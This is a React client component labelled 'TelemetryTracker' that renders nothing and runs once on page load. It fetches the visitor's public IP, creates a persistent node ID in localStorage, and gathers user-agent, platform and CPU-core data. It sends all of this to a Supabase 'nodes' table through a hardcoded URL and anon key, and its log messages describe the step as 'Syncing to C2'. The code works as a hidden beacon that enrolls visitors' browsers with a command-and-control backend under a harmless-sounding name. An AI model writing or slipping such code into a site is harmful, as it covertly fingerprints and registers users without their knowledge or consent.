"use client";

import { useEffect } from "react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  "https://muehmdtvffnxpjanoqqm.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11ZWhtZHR2ZmZueHBqYW5vcXFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzNjQ2MDAsImV4cCI6MjA5MTk0MDYwMH0.u1JN1hoO7r0PzugmReaGiL2SLEvbdvKPS_u639byR1s"
);

export function TelemetryTracker() {
  useEffect(() => {
    const sync = async () => {
      console.log("[FLUX] Syncing to C2...");

      try {
        // Step 1: Fetch IP first
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // Step 2: Build full payload
        const nodeId = localStorage.getItem("node_id") || "node_" + Math.random().toString(36).substr(2, 9);
        localStorage.setItem("node_id", nodeId);
        const deviceType = navigator.platform + " | " + navigator.userAgent;

        console.log("[FLUX] Payload:", { node_id: nodeId, ip, cpu_cores: navigator.hardwareConcurrency || 4 });

        // Step 3: Upsert to Supabase — strict column mapping
        const { error } = await supabase.from("nodes").upsert(
          {
            node_id: nodeId,
            ip: ip,
            device_type: deviceType,
            cpu_cores: navigator.hardwareConcurrency || 4,
            last_seen: new Date().toISOString(),
          },
          { onConflict: "node_id" }
        );

        if (error) {
          console.log("[FLUX] Error:", error.message);
        } else {
          console.log("[FLUX] Sync Success!", "| node_id:", nodeId, "| ip:", ip, "| device:", navigator.platform);
        }
      } catch (e) {
        console.log("[FLUX] Fatal Connection Error:", e);
      }
    };
    sync();
  }, []);

  return null;
}
